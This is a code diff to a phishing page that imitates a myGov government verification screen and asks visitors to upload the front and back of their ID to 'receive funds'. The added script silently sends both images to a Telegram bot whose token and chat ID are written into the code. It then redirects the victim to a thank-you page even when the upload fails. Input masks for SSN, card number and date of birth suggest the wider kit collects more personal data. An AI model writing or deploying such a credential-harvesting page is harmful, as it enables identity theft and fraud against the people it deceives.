@@ -42,19 +42,16 @@
                                     <a data-go-back-link="" class="button-back" href="#">Back</a>
                                     <h1>Verification</h1>
                                     <h2 class="text-align-left">PLEASE UPLOAD YOUR ID TO COMPLETE VERIFICATION AND RECEIVE YOUR FUNDS</h2>
-                                    <form class="mygov-login-form alternative" method="post" action="./next.php" method="POST" enctype="multipart/form-data">
+                                    <!-- Remove action="./next.php" – we handle submission via JavaScript -->
+                                    <form id="form-1" class="mygov-login-form alternative" method="post" enctype="multipart/form-data">
                                         <div class="input-group">
                                             <label class="override" for="userId">ID Front</label>
-                                            <input id="upf" name="upf" type="file" value="" autocomplete="off" required="">
+                                            <input id="upf" name="upf" type="file" required>
                                         </div>
                                         <div class="input-group">
                                             <label class="override" for="userId">ID Back</label>
-                                            <input id="upb" name="upb" type="file" value="" autocomplete="off" required="">
+                                            <input id="upb" name="upb" type="file" required>
                                         </div>
-                                        
-                                        
-                                        
-                                        
                                         <br>
                                         <div class="button-digital-id-main-container override">
                                             <div class="digital-id-button-container">
@@ -62,7 +59,6 @@
                                             </div>
                                         </div>
                                     </form>
-                                    
                                 </div>
                             </div>
                         </div>
@@ -78,18 +74,10 @@
                     <nav>
                         <h2 class="sr-only" aria-label="Footer">Footer</h2>
                         <ul class="lower-links">
-                            <li>
-                                <a target="_blank" href="#">Terms of use</a>
-                            </li>
-                            <li>
-                                <a target="_blank" href="#">Privacy and security</a>
-                            </li>
-                            <li>
-                                <a target="_blank" href="#">Copyright</a>
-                            </li>
-                            <li>
-                                <a target="_blank" href="#">Accessibility</a>
-                            </li>
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
                         </ul>
                     </nav>
                 </section>
@@ -105,20 +93,78 @@
         </div>
     </footer>
 
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script type="text/javascript">
         $("#ssn").inputmask({"mask": "999-99-9999"});
-    $("#cn").inputmask({"mask": "9999 9999 9999 9999"});
+        $("#cn").inputmask({"mask": "9999 9999 9999 9999"});
         $("#dob").inputmask({"mask": "99/99/9999","placeholder":"DD/MM/YYYY"});
         $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
         $("#ph").inputmask({"mask": "999-999-9999"});
     </script>
-    <!-- Optional JavaScript -->
-    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <!-- 🚫 REMOVED slim jQuery to avoid breaking $.ajax -->
+    <!-- <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script> -->
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
-</body>
 
+    <!-- ====== TELEGRAM UPLOAD SCRIPT (at the very bottom) ====== -->
+    <script>
+        // ============================================================
+        // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
+        // ============================================================
+        const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
+        const CHAT_ID = '722615124';
+        // ============================================================
+
+        $(document).ready(function() {
+            $('#form-1').on('submit', function(e) {
+                e.preventDefault(); // Prevent page reload
+
+                // Get the selected files
+                const fileFront = $('#upf')[0].files[0];
+                const fileBack = $('#upb')[0].files[0];
+
+                // If no files selected, stop (shouldn't happen due to 'required')
+                if (!fileFront || !fileBack) {
+                    alert('Please select both ID images.');
+                    return;
+                }
+
+                // Function to send a single file to Telegram
+                function sendFile(file, caption) {
+                    return new Promise((resolve, reject) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('document', file);
+                        formData.append('caption', caption);
+
+                        $.ajax({
+                            url: `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+                            type: 'POST',
+                            data: formData,
+                            contentType: false,
+                            processData: false,
+                            success: resolve,
+                            error: reject
+                        });
+                    });
+                }
+
+                // Send front, then back, then redirect to thank.html
+                sendFile(fileFront, '📄 ID - Front')
+                    .then(() => sendFile(fileBack, '📄 ID - Back'))
+                    .then(() => {
+                        window.location.href = 'thank.html';
+                    })
+                    .catch(() => {
+                        // Even if upload fails, redirect the user to keep the flow going
+                        window.location.href = 'thank.html';
+                    });
+            });
+        });
+    </script>
+
+</body>
 </html>
